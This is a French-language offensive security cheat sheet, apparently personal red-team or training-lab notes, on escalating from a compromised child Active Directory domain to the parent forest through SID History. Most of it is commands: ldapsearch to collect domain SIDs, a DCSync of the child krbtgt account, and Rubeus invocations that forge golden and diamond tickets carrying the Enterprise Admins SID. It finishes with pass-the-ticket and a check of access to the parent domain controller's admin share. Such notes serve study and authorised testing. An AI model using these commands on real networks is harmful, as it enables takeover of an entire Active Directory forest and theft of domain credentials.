

> [!TIP]
> SID History attribut -> Attribut ajouté si un user est migré d'un domaine à un autre.
> ie. Si un admin du domaine est migré sur un autre domaine, son SID est sauvegardé en historique afin de toujours pouvoir accéder au premier domaine. -> Golden et Diamond Ticket / DCSync ...

> [!TIP]
> Cette attaque permet de compromettre un domaine parent une fois le domaine enfant compromis grace au SidHistory correspondant au groupe "Admins d'entreprise"


- [[#Golden Ticket]]
- [[#Diamond Ticket]] (OPSEC)


1. Récupérer le SID du domaine parent

```
ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```

2. Récupérer le SID du domaine enfant

```
ldapsearch (objectClass=domain) --attributes objectSid
```

3. DCSync le compte krbtgt du domaine enfant

```
dcsync dublin.contoso.com DUBLIN\krbtgt
```

# Golden Ticket

Pour performer cette attaque, besoin des éléments suivants:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain (519).

Consiste à forger un Golden Ticket pour accéder au domaine parent 


1. Forger le ticket en offline

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt_aes> /user:Administrator /domain:<fqdn_child_domain> /sid:<sid_child_domain> /sids:<sid_enterprise_admins> /nowrap
```

2. usurper administrator depuis une session SYSTEM

3. pass the ticket

4. enjoy


# Diamond Ticket


1. Requête avec tgtdeleg depuis session medium

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:<sid_enterprise_admins> /krbkey:<krbtgt_aes> /nowrap
```

2. usurper administrator depuis une session SYSTEM

3. pass the ticket

4. Vérifier accès au partage du DC parent

```
ls \\lon-dc-1\c$
```